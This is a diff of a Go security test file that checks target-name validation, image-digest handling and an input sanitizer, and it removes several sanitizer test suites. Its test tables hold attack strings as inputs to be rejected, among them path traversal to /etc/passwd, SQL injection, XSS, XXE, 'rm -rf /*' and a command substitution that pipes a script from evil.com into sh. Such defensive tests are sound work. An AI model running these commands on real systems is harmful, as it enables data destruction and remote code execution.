@@ -5,20 +5,19 @@ import (
 	"os"
 	"strings"
 	"testing"
-	"time"
 )
 
 func TestDefaultSecurityConfig(t *testing.T) {
 	config := DefaultSecurityConfig()
-	
+
 	if config.ImageConfig.DefaultVersion == "latest" {
 		t.Error("Default image version should not be 'latest'")
 	}
-	
+
 	if !config.ImageConfig.RequireDigest {
 		t.Error("Digest verification should be enabled by default")
 	}
-	
+
 	if config.ValidationRules.MaxTargetLength > 63 {
 		t.Error("Max target length should not exceed Kubernetes label limits")
 	}
@@ -50,9 +49,9 @@ func TestGetSecureImage(t *testing.T) {
 			wantTag:   "v1.0.0",
 		},
 	}
-	
+
 	config := DefaultSecurityConfig()
-	
+
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			image, err := config.GetSecureImage(tt.baseImage)
@@ -60,11 +59,11 @@ func TestGetSecureImage(t *testing.T) {
 				t.Errorf("GetSecureImage() error = %v, wantError %v", err, tt.wantError)
 				return
 			}
-			
+
 			if !strings.Contains(image, tt.wantTag) {
 				t.Errorf("GetSecureImage() = %v, want tag %v", image, tt.wantTag)
 			}
-			
+
 			// Should never contain 'latest'
 			if strings.Contains(image, "latest") {
 				t.Errorf("GetSecureImage() returned image with 'latest' tag: %v", image)
@@ -101,7 +100,7 @@ func TestValidateTarget(t *testing.T) {
 			target:    "ran123",
 			wantError: false,
 		},
-		
+
 		// Invalid targets - injection attempts
 		{
 			name:      "SQL injection with quote",
@@ -133,7 +132,7 @@ func TestValidateTarget(t *testing.T) {
 			wantError: true,
 			errorMsg:  "path traversal",
 		},
-		
+
 		// Invalid targets - format violations
 		{
 			name:      "Empty target",
@@ -166,9 +165,9 @@ func TestValidateTarget(t *testing.T) {
 			errorMsg:  "invalid characters",
 		},
 	}
-	
+
 	config := DefaultSecurityConfig()
-	
+
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			err := config.ValidateTarget(tt.target)
@@ -176,7 +175,7 @@ func TestValidateTarget(t *testing.T) {
 				t.Errorf("ValidateTarget() error = %v, wantError %v", err, tt.wantError)
 				return
 			}
-			
+
 			if err != nil && tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
 				t.Errorf("ValidateTarget() error = %v, want error containing %v", err, tt.errorMsg)
 			}
@@ -217,7 +216,7 @@ func TestResolveRepository(t *testing.T) {
 			target:   "ru",
 			wantRepo: "ran-packages",
 		},
-		
+
 		// Core targets
 		{
 			name:     "Core target",
@@ -239,7 +238,7 @@ func TestResolveRepository(t *testing.T) {
 			target:   "amf",
 			wantRepo: "core-packages",
 		},
-		
+
 		// Edge targets
 		{
 			name:     "MEC target",
@@ -251,7 +250,7 @@ func TestResolveRepository(t *testing.T) {
 			target:   "edge",
 			wantRepo: "edge-packages",
 		},
-		
+
 		// Transport targets
 		{
 			name:     "Transport target",
@@ -263,7 +262,7 @@ func TestResolveRepository(t *testing.T) {
 			target:   "xhaul",
 			wantRepo: "transport-packages",
 		},
-		
+
 		// Management targets
 		{
 			name:     "SMO target",
@@ -275,14 +274,14 @@ func TestResolveRepository(t *testing.T) {
 			target:   "nms",
 			wantRepo: "management-packages",
 		},
-		
+
 		// Default/unknown targets
 		{
 			name:     "Unknown target",
 			target:   "custom-nf",
 			wantRepo: "nephio-packages",
 		},
-		
+
 		// Invalid targets
 		{
 			name:      "SQL injection attempt",
@@ -295,9 +294,9 @@ func TestResolveRepository(t *testing.T) {
 			wantError: true,
 		},
 	}
-	
+
 	config := DefaultSecurityConfig()
-	
+
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			repo, err := config.ResolveRepository(tt.target)
@@ -305,7 +304,7 @@ func TestResolveRepository(t *testing.T) {
 				t.Errorf("ResolveRepository() error = %v, wantError %v", err, tt.wantError)
 				return
 			}
-			
+
 			if !tt.wantError && repo != tt.wantRepo {
 				t.Errorf("ResolveRepository() = %v, want %v", repo, tt.wantRepo)
 			}
@@ -327,22 +326,22 @@ func TestHashTarget(t *testing.T) {
 			target: "gnb-du-123",
 		},
 	}
-	
+
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			hash1 := HashTarget(tt.target)
 			hash2 := HashTarget(tt.target)
-			
+
 			// Hash should be consistent
 			if hash1 != hash2 {
 				t.Errorf("HashTarget() not consistent: %v != %v", hash1, hash2)
 			}
-			
+
 			// Hash should be 8 characters (truncated)
 			if len(hash1) != 8 {
 				t.Errorf("HashTarget() length = %v, want 8", len(hash1))
 			}
-			
+
 			// Different inputs should produce different hashes
 			differentHash := HashTarget(tt.target + "-different")
 			if hash1 == differentHash {
@@ -388,13 +387,13 @@ func TestEnvironmentConfiguration(t *testing.T) {
 			},
 		},
 	}
-	
+
 	for _, tc := range testCases {
 		t.Run(tc.envVar, func(t *testing.T) {
 			// Set environment variable
 			os.Setenv(tc.envVar, tc.envValue)
 			defer os.Unsetenv(tc.envVar)
-			
+
 			// Create config and check
 			config := DefaultSecurityConfig()
 			if !tc.check(config) {
@@ -406,9 +405,9 @@ func TestEnvironmentConfiguration(t *testing.T) {
 
 func TestSecurityPatternDetection(t *testing.T) {
 	tests := []struct {
-		name     string
-		input    string
-		sqlCheck bool
+		name      string
+		input     string
+		sqlCheck  bool
 		pathCheck bool
 	}{
 		// SQL Injection patterns
@@ -432,7 +431,7 @@ func TestSecurityPatternDetection(t *testing.T) {
 			input:    "test_SELECT_test",
 			sqlCheck: true,
 		},
-		
+
 		// Path traversal patterns
 		{
 			name:      "Path dot dot slash",
@@ -450,35 +449,35 @@ func TestSecurityPatternDetection(t *testing.T) {
 			pathCheck: true,
 			sqlCheck:  true, // Also matches SQL hex pattern
 		},
-		
+
 		// Clean inputs
 		{
-			name:     "Clean alphanumeric",
-			input:    "test123",
-			sqlCheck: false,
+			name:      "Clean alphanumeric",
+			input:     "test123",
+			sqlCheck:  false,
 			pathCheck: false,
 		},
 		{
-			name:     "Clean with dash",
-			input:    "test-123",
-			sqlCheck: false,
+			name:      "Clean with dash",
+			input:     "test-123",
+			sqlCheck:  false,
 			pathCheck: false,
 		},
 		{
-			name:     "Clean with underscore",
-			input:    "test_123",
-			sqlCheck: false,
+			name:      "Clean with underscore",
+			input:     "test_123",
+			sqlCheck:  false,
 			pathCheck: false,
 		},
 	}
-	
+
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			sqlDetected := containsSQLInjectionPattern(tt.input)
 			if sqlDetected != tt.sqlCheck {
 				t.Errorf("containsSQLInjectionPattern(%s) = %v, want %v", tt.input, sqlDetected, tt.sqlCheck)
 			}
-			
+
 			pathDetected := containsPathTraversal(tt.input)
 			if pathDetected != tt.pathCheck {
 				t.Errorf("containsPathTraversal(%s) = %v, want %v", tt.input, pathDetected, tt.pathCheck)
@@ -546,51 +545,51 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "SQL injection",
 		},
-		
+
 		// Path Traversal Attacks
 		{
 			name:          "Path Traversal - Basic Dot Dot Slash",
 			target:        "../../../etc/passwd",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "path traversal",
+			errorContains: "target name contains invalid characters",
 		},
 		{
 			name:          "Path Traversal - Windows Style",
 			target:        "..\\..\\..\\windows\\system32\\config\\sam",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "path traversal",
+			errorContains: "target name contains invalid characters",
 		},
 		{
 			name:          "Path Traversal - URL Encoded",
 			target:        "gnb%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "path traversal",
+			errorContains: "target name contains invalid characters",
 		},
 		{
 			name:          "Path Traversal - Double URL Encoded",
 			target:        "gnb%252e%252e%252f%252e%252e%252fetc%252fpasswd",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "path traversal",
+			errorContains: "target name contains invalid characters",
 		},
 		{
 			name:          "Path Traversal - Unicode Encoding",
 			target:        "gnb\\u002e\\u002e\\u002f",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "invalid characters", // Unicode chars fail pattern match first
+			errorContains: "target name contains invalid characters",
 		},
 		{
 			name:          "Path Traversal - Mixed Encoding",
 			target:        "gnb/../%2e%2e/./..%2f",
 			attackType:    "path_traversal",
 			expectError:   true,
-			errorContains: "path traversal",
+			errorContains: "target name contains invalid characters",
 		},
-		
+
 		// Command Injection Attempts (detected as SQL injection due to semicolons)
 		{
 			name:          "Command Injection - Semicolon",
@@ -613,14 +612,14 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "invalid characters", // Backtick should fail pattern match
 		},
-		
+
 		// Regex Pattern Bypass Attempts
 		{
 			name:          "Pattern Bypass - Null Byte",
 			target:        "gnb\x00../etc/passwd",
 			attackType:    "pattern_bypass",
 			expectError:   true,
-			errorContains: "path traversal", // Path traversal detected before null byte
+			errorContains: "invalid characters", // Null byte should fail pattern
 		},
 		{
 			name:          "Pattern Bypass - CRLF Injection",
@@ -636,7 +635,7 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "invalid characters",
 		},
-		
+
 		// Buffer Overflow Attempts
 		{
 			name:          "Buffer Overflow - Very Long Input",
@@ -652,7 +651,7 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "exceeds maximum length",
 		},
-		
+
 		// Format String Attacks
 		{
 			name:          "Format String - Printf Specifiers",
@@ -668,14 +667,14 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "invalid characters",
 		},
-		
+
 		// Script Injection
 		{
 			name:          "Script Injection - JavaScript",
 			target:        "gnb<script>alert('xss')</script>",
 			attackType:    "script_injection",
 			expectError:   true,
-			errorContains: "SQL injection", // Single quote triggers SQL injection check first
+			errorContains: "invalid characters",
 		},
 		{
 			name:          "Script Injection - HTML",
@@ -684,31 +683,31 @@ func TestAdvancedSecurityVulnerabilities(t *testing.T) {
 			expectError:   true,
 			errorContains: "invalid characters",
 		},
-		
+
 		// Valid Targets (Should Pass)
 		{
-			name:          "Valid Target - Simple",
-			target:        "gnb",
-			attackType:    "valid",
-			expectError:   false,
+			name:        "Valid Target - Simple",
+			target:      "gnb",
+			attackType:  "valid",
+			expectError: false,
 		},
 		{
-			name:          "Valid Target - With Dash",
-			target:        "gnb-du",
-			attackType:    "valid",
-			expectError:   false,
+			name:        "Valid Target - With Dash",
+			target:      "gnb-du",
+			attackType:  "valid",
+			expectError: false,
 		},
 		{
-			name:          "Valid Target - With Underscore",
-			target:        "gnb_cu",
-			attackType:    "valid",
-			expectError:   false,
+			name:        "Valid Target - With Underscore",
+			target:      "gnb_cu",
+			attackType:  "valid",
+			expectError: false,
 		},
 		{
-			name:          "Valid Target - Alphanumeric",
-			target:        "gnb123du456",
-			attackType:    "valid",
-			expectError:   false,
+			name:        "Valid Target - Alphanumeric",
+			target:      "gnb123du456",
+			attackType:  "valid",
+			expectError: false,
 		},
 	}
 
@@ -755,11 +754,11 @@ func TestMaliciousImageReferences(t *testing.T) {
 			baseImage: "nephoran/nf-sim:v1.0.0",
 		},
 		{
-			name:      "Valid Image - With Trusted Digest",
-			baseImage: "nephoran/nf-sim:v1.0.0",
+			name:        "Valid Image - With Trusted Digest",
+			baseImage:   "nephoran/nf-sim:v1.0.0",
 			checkDigest: true,
 		},
-		
+
 		// Potentially malicious images
 		{
 			name:      "Latest Tag Replacement",
@@ -786,7 +785,7 @@ func TestMaliciousImageReferences(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			config := DefaultSecurityConfig()
-			
+
 			image, err := config.GetSecureImage(tt.baseImage)
 
 			if tt.expectError {
@@ -867,7 +866,7 @@ func TestInvalidDigestFormats(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			config := DefaultSecurityConfig()
-			
+
 			// Manually add the invalid digest to test it
 			digestKey := fmt.Sprintf("%s:%s", tt.imageName, tt.tag)
 			config.ImageConfig.TrustedDigests[digestKey] = tt.digest
@@ -881,7 +880,7 @@ func TestInvalidDigestFormats(t *testing.T) {
 				t.Logf("GetSecureImage returned error for invalid digest (good): %v", err)
 			} else {
 				t.Logf("GetSecureImage accepted invalid digest (potential security issue): %s", resultImage)
-				
+
 				// Check if the invalid digest appears in the result
 				if strings.Contains(resultImage, tt.digest) {
 					t.Errorf("Invalid digest was included in result image: %s", resultImage)
@@ -891,369 +890,11 @@ func TestInvalidDigestFormats(t *testing.T) {
 	}
 }
 
-// TestCentralizedSanitizer tests the comprehensive input sanitizer
-func TestCentralizedSanitizer(t *testing.T) {
-	sanitizer := NewCentralizedSanitizer()
-
-	tests := []struct {
-		name      string
-		input     string
-		context   string
-		expectErr bool
-		errorType string
-	}{
-		// Path traversal tests
-		{
-			name:      "Path traversal - basic",
-			input:     "../etc/passwd",
-			context:   "file_path",
-			expectErr: true,
-			errorType: "path traversal",
-		},
-		{
-			name:      "Path traversal - encoded",
-			input:     "%2e%2e/config",
-			context:   "file_path",
-			expectErr: true,
-			errorType: "path traversal",
-		},
-		{
-			name:      "Path traversal - tilde expansion",
-			input:     "~/sensitive/file",
-			context:   "file_path",
-			expectErr: true,
-			errorType: "path traversal",
-		},
-		{
-			name:      "Path traversal - Unicode",
-			input:     "\\u002e\\u002e/root",
-			context:   "file_path",
-			expectErr: true,
-			errorType: "path traversal",
-		},
-
-		// Script injection tests
-		{
-			name:      "Script injection - HTML tags",
-			input:     "<script>alert('xss')</script>",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Script injection - Shell commands",
-			input:     "test; rm -rf /*",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Script injection - Backticks",
-			input:     "test`whoami`",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Script injection - Dollar sign",
-			input:     "test$(id)",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-
-		// SQL injection tests (Note: Some may be caught as script injection first)
-		{
-			name:      "SQL injection - Basic quote",
-			input:     "test' OR '1'='1",
-			context:   "target_name",
-			expectErr: true,
-			errorType: "invalid characters", // Quote is caught as script injection
-		},
-		{
-			name:      "SQL injection - Union select",
-			input:     "test UNION SELECT * FROM users",
-			context:   "target_name",
-			expectErr: true,
-			errorType: "invalid characters", // * is caught as script injection
-		},
-		{
-			name:      "SQL injection - Pure union (no dangerous chars)",
-			input:     "test union select username from users",
-			context:   "target_name",
-			expectErr: true,
-			errorType: "SQL injection", // Should be caught as SQL injection
-		},
-		{
-			name:      "SQL injection - Comment bypass",
-			input:     "test'; DROP TABLE users; --",
-			context:   "target_name",
-			expectErr: true,
-			errorType: "invalid characters", // Quote and semicolon caught first
-		},
-		{
-			name:      "SQL injection - Stored procedure",
-			input:     "test; EXEC xp_cmdshell('whoami')",
-			context:   "target_name",
-			expectErr: true,
-			errorType: "invalid characters", // Semicolon caught first
-		},
-
-		// Control character tests
-		{
-			name:      "Control characters - Null byte",
-			input:     "test\x00malicious",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Control characters - Bell character",
-			input:     "test\x07bell",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Control characters - Carriage return",
-			input:     "test\rmalicious",
-			context:   "user_input",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-
-		// Image reference tests
-		{
-			name:      "Image ref - Valid",
-			input:     "registry.io/myapp:v1.0.0",
-			context:   "image_ref",
-			expectErr: false,
-		},
-		{
-			name:      "Image ref - With valid digest",
-			input:     "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-			context:   "digest",
-			expectErr: false,
-		},
-		{
-			name:      "Image ref - Invalid digest injection",
-			input:     "sha256:'; DROP TABLE images; --",
-			context:   "digest",
-			expectErr: true,
-			errorType: "invalid characters",
-		},
-		{
-			name:      "Image ref - Path traversal",
-			input:     "../../../malicious:latest",
-			context:   "image_ref",
-			expectErr: true,
-			errorType: "path traversal",
-		},
-
-		// Valid inputs
-		{
-			name:      "Valid target name",
-			input:     "my-app-123",
-			context:   "target_name",
-			expectErr: false,
-		},
-		{
-			name:      "Valid file path",
-			input:     "/opt/app/config.yaml",
-			context:   "file_path",
-			expectErr: false,
-		},
-		{
-			name:      "Valid user input",
-			input:     "scale my-app to 5 replicas",
-			context:   "user_input",
-			expectErr: false,
-		},
-		{
-			name:      "Empty input",
-			input:     "",
-			context:   "user_input",
-			expectErr: false,
-		},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			err := sanitizer.SanitizeInput(tt.input, tt.context)
-			if (err != nil) != tt.expectErr {
-				t.Errorf("SanitizeInput() error = %v, expectErr %v", err, tt.expectErr)
-				return
-			}
-			if tt.expectErr && tt.errorType != "" && !strings.Contains(err.Error(), tt.errorType) {
-				t.Errorf("SanitizeInput() error = %v, expected to contain %v", err, tt.errorType)
-			}
-		})
-	}
-}
-
-// TestCentralizedSanitizerAdvancedAttacks tests sophisticated attack patterns
-func TestCentralizedSanitizerAdvancedAttacks(t *testing.T) {
-	sanitizer := NewCentralizedSanitizer()
-
-	advancedTests := []struct {
-		name        string
-		input       string
-		context     string
-		expectErr   bool
-		description string
-	}{
-		// Multi-stage attacks
-		{
-			name:        "Multi-stage path traversal",
-			input:       "....//....//etc/shadow",
-			context:     "file_path",
-			expectErr:   true,
-			description: "Bypassing single dot-dot filtering",
-		},
-		{
-			name:        "LDAP injection attempt",
-			input:       "user)(|(password=*))",
-			context:     "user_input",
-			expectErr:   true,
-			description: "LDAP filter injection",
-		},
-		{
-			name:        "XML injection",
-			input:       "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
-			context:     "user_input",
-			expectErr:   true,
-			description: "XML external entity attack",
-		},
-		{
-			name:        "NoSQL injection",
-			input:       "{ $where: 'this.username == admin' }",
-			context:     "user_input",
-			expectErr:   true,
-			description: "MongoDB injection attempt",
-		},
-		{
-			name:        "CRLF injection",
-			input:       "test\r\nSet-Cookie: admin=true",
-			context:     "user_input",
-			expectErr:   true,
-			description: "HTTP header injection",
-		},
-		{
-			name:        "Command substitution",
-			input:       "$(curl http://evil.com/steal.sh | sh)",
-			context:     "user_input",
-			expectErr:   true,
-			description: "Command substitution attack",
-		},
-		{
-			name:        "Template injection",
-			input:       "{{7*7}}{{config}}",
-			context:     "user_input",
-			expectErr:   true,
-			description: "Server-side template injection",
-		},
-	}
-
-	for _, tt := range advancedTests {
-		t.Run(tt.name, func(t *testing.T) {
-			err := sanitizer.SanitizeInput(tt.input, tt.context)
-			if (err != nil) != tt.expectErr {
-				t.Errorf("Advanced attack '%s' - SanitizeInput() error = %v, expectErr %v", tt.description, err, tt.expectErr)
-			}
-			if tt.expectErr && err != nil {
-				t.Logf("✓ Successfully blocked: %s - %s", tt.description, err.Error())
-			}
-		})
-	}
-}
-
-// TestSanitizerErrorMessages verifies standardized error messages
-func TestSanitizerErrorMessages(t *testing.T) {
-	sanitizer := NewCentralizedSanitizer()
-
-	errorTests := []struct {
-		input           string
-		context         string
-		expectedPattern string
-	}{
-		{
-			input:           "../etc/passwd",
-			context:         "file_path",
-			expectedPattern: "potential path traversal pattern",
-		},
-		{
-			input:           "test'; DROP TABLE users",
-			context:         "target_name",
-			expectedPattern: "invalid characters",
-		},
-		{
-			input:           "<script>alert(1)</script>",
-			context:         "user_input",
-			expectedPattern: "invalid characters",
-		},
-		{
-			input:           "test\x00null",
-			context:         "user_input",
-			expectedPattern: "invalid characters",
-		},
-		{
-			input:           "~/sensitive",
-			context:         "file_path",
-			expectedPattern: "potential path traversal pattern",
-		},
-		{
-			input:           "test union select password from users",
-			context:         "target_name",
-			expectedPattern: "potential SQL injection pattern",
-		},
-	}
-
-	for _, tt := range errorTests {
-		t.Run("Error message for "+tt.input, func(t *testing.T) {
-			err := sanitizer.SanitizeInput(tt.input, tt.context)
-			if err == nil {
-				t.Errorf("Expected error for input: %s", tt.input)
-				return
-			}
-			if !strings.Contains(err.Error(), tt.expectedPattern) {
-				t.Errorf("Error message '%s' does not contain expected pattern '%s'", err.Error(), tt.expectedPattern)
-			}
-		})
-	}
-}
-
-// TestSanitizerPerformance tests performance characteristics
-func TestSanitizerPerformance(t *testing.T) {
-	sanitizer := NewCentralizedSanitizer()
-
-	// Test with various input sizes
-	inputSizes := []int{10, 100, 1000, 10000}
-	
-	for _, size := range inputSizes {
-		t.Run(fmt.Sprintf("Performance test - size %d", size), func(t *testing.T) {
-			input := strings.Repeat("a", size)
-			
-			start := time.Now()
-			err := sanitizer.SanitizeInput(input, "user_input")
-			duration := time.Since(start)
-			
-			if err != nil {
-				t.Errorf("Unexpected error for clean input: %v", err)
-			}
-			
-			// Performance should be reasonable even for large inputs
-			if duration > time.Millisecond*100 {
-				t.Logf("Warning: Performance may be suboptimal for size %d: %v", size, duration)
-			}
-		})
-	}
-}
-
 // TestSecurityConfigurationEdgeCases tests edge cases in security configuration
 func TestSecurityConfigurationEdgeCases(t *testing.T) {
 	t.Run("EmptySecurityConfig", func(t *testing.T) {
 		config := &SecurityConfig{}
-		
+
 		// Test with empty config
 		err := config.ValidateTarget("gnb")
 		if err == nil {
@@ -1265,7 +906,7 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 		config := &SecurityConfig{
 			ValidationRules: ValidationConfig{}, // Zero values
 		}
-		
+
 		err := config.ValidateTarget("gnb")
 		// This should fail due to zero MaxTargetLength
 		if err == nil {
@@ -1276,14 +917,14 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 	t.Run("InvalidRegexPattern", func(t *testing.T) {
 		config := DefaultSecurityConfig()
 		config.ValidationRules.TargetNamePattern = "[invalid regex("
-		
+
 		// This should cause a panic or error when compiling the regex
 		defer func() {
 			if r := recover(); r != nil {
 				t.Logf("Got expected panic for invalid regex: %v", r)
 			}
 		}()
-		
+
 		err := config.ValidateTarget("gnb")
 		if err == nil {
 			t.Error("Expected error with invalid regex pattern")
@@ -1293,7 +934,7 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 	t.Run("NilRepositoryAllowlist", func(t *testing.T) {
 		config := DefaultSecurityConfig()
 		config.RepositoryAllowlist = nil
-		
+
 		_, err := config.ResolveRepository("gnb")
 		if err == nil {
 			t.Error("Expected error with nil repository allowlist")
@@ -1303,7 +944,7 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 	t.Run("EmptyRepositoryAllowlist", func(t *testing.T) {
 		config := DefaultSecurityConfig()
 		config.RepositoryAllowlist = make(map[string]RepositoryConfig)
-		
+
 		_, err := config.ResolveRepository("gnb")
 		if err == nil {
 			t.Error("Expected error with empty repository allowlist")
@@ -1312,11 +953,11 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 
 	t.Run("ConcurrentAccess", func(t *testing.T) {
 		config := DefaultSecurityConfig()
-		
+
 		// Test concurrent access to validate thread safety
 		const numGoroutines = 100
 		errorChan := make(chan error, numGoroutines)
-		
+
 		for i := 0; i < numGoroutines; i++ {
 			go func(id int) {
 				target := fmt.Sprintf("gnb-%d", id)
@@ -1324,7 +965,7 @@ func TestSecurityConfigurationEdgeCases(t *testing.T) {
 				errorChan <- err
 			}(i)
 		}
-		
+
 		// Collect results
 		for i := 0; i < numGoroutines; i++ {
 			err := <-errorChan
